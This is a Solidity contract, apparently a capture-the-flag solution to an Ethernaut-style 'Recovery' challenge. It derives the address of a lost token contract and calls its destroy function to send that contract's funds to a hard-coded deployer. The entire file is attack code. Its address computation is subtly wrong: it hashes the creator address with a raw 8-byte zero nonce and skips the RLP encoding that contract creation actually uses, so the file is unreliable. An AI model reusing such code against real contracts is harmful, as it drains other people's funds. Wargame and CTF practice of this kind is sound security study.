pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryCorrectAttacker {
    ISimpleToken public token;
    address public deployer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor() {
        address recoveryInstance = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
        uint64 n = 0;
        bytes8 nonceBE = bytes8(n);
        bytes32 hash = keccak256(abi.encodePacked(recoveryInstance, nonceBE));
        address target = address(uint160(uint256(hash)));
        token = ISimpleToken(payable(target));
    }

    function destruct() external {
        token.destroy(payable(deployer));
    }
}